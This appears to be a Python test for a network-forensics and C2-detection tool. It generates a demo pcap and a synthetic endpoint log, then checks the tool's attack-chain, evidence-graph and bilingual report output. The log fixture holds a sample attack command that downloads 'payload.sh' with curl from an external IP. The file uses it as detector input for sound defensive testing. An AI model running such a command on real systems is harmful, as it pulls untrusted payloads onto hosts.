from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.parser.pcap_parser import parse_network_events


def main() -> None:
    subprocess.run([sys.executable, "tests/make_demo_pcap.py"], cwd=PROJECT_ROOT, check=True)
    first_event = parse_network_events(str(PROJECT_ROOT / "data/pcap/demo_attack.pcap"))[0]
    endpoint_time = (first_event.timestamp or 0) + 30
    tmp = PROJECT_ROOT / "data" / "tmp"
    tmp.mkdir(parents=True, exist_ok=True)
    endpoint = tmp / "endpoint_multisource.csv"
    endpoint.write_text(
        "timestamp,host,process_name,command_line,dst_ip,dst_port\n"
        f'{endpoint_time},10.10.10.20,bash,"bash -c whoami; curl http://203.0.113.50/payload.sh -o /tmp/payload.sh",203.0.113.50,8080\n',
        encoding="utf-8",
    )

    result = subprocess.run(
        [
            sys.executable,
            "main.py",
            "--mode",
            "pcap",
            "--input",
            "data/pcap/demo_attack.pcap",
            "--demo-index",
            "--endpoint-log",
            str(endpoint.relative_to(PROJECT_ROOT)),
        ],
        cwd=PROJECT_ROOT,
        check=True,
        capture_output=True,
        text=True,
    )
    report_path = PROJECT_ROOT / json.loads(result.stdout)["report"]
    analysis = json.loads(report_path.with_suffix(".json").read_text(encoding="utf-8"))

    stages = {item["stage"] for item in analysis["attack_chain"]}
    assert "Exploitation" in stages
    assert "Command Execution" in stages
    assert "Payload Delivery" in stages
    assert analysis["impact_assessment"]["verdict"] == "Likely successful exploitation with C2 indicators"
    assert analysis["impact_assessment"]["confidence"] == "high"
    assert analysis["c2_findings"]
    assert any(item["c2_type"] == "Endpoint External Connection" for item in analysis["c2_findings"])
    evidence_ids = {item["evidence_id"] for item in analysis["agent_findings"]["evidence_pack"]}
    assert "endpoint1-1" in evidence_ids
    relations = {item["relation"] for item in analysis["evidence_graph"]["edges"]}
    assert "same_asset" in relations
    assert "temporal_sequence" in relations
    assert "process_external_connection" in relations
    graph_nodes = {item["node_id"] for item in analysis["evidence_graph"]["nodes"]}
    assert "external:203.0.113.50:8080" in graph_nodes
    assert analysis["evidence_graph"]["paths"]
    assert "endpoint1-1" in analysis["evidence_graph"]["paths"][0]["summary"]
    assert any("Evidence path:" in item for item in analysis["agent_findings"]["key_findings"])

    mermaid = analysis["evidence_graph"]["mermaid"]
    assert mermaid.startswith("flowchart TD")
    assert "process_external_connection" in mermaid
    mermaid_zh = analysis["evidence_graph"]["mermaid_zh"]
    assert mermaid_zh.startswith("flowchart TD")
    assert "进程外联" in mermaid_zh
    dot = analysis["evidence_graph"]["dot"]
    assert dot.startswith("digraph FlowTragentEvidence")
    assert "process_external_connection" in dot
    dot_zh = analysis["evidence_graph"]["dot_zh"]
    assert dot_zh.startswith("digraph FlowTragentEvidence")
    assert "进程外联" in dot_zh

    report = report_path.read_text(encoding="utf-8")
    assert "endpoint1-1" in report
    assert "## Evidence Graph" in report
    assert "```mermaid" in report
    assert "```graphviz" in report

    zh_report_path = report_path.with_name(f"{report_path.stem}_zh.md")
    assert zh_report_path.exists()
    zh_report = zh_report_path.read_text(encoding="utf-8")
    assert "## 中文摘要" in zh_report
    assert "疑似成功利用并伴随 C2 通信迹象" in zh_report
    assert "进程外联" in zh_report


if __name__ == "__main__":
    main()
